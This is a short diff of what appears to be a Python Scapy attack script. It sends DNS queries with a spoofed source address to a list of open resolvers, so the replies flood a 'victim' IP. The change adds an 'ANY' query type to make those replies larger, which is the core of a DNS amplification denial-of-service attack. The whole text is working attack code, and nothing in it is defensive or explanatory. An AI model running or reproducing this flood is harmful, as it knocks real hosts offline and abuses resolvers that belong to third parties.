@@ -33,7 +33,7 @@ def main(api_key: str,victim:str,targeted_domain:str):
         with open('DNS-Resolvers.txt') as f:
             contents = f.readlines()
             for ip in contents:
-            	dns = IP(src=victim,dst=ip.strip())/UDP(dport=53)/DNS(rd=1,qd=DNSQR(qname=targeted_domain))
+            	dns = IP(src=victim,dst=ip.strip())/UDP(dport=53)/DNS(rd=1,qd=DNSQR(qname=targeted_domain, qtype="ANY"))
             	sent = send(dns,count=5,return_packets=True)
             	print(sent.summary())
   
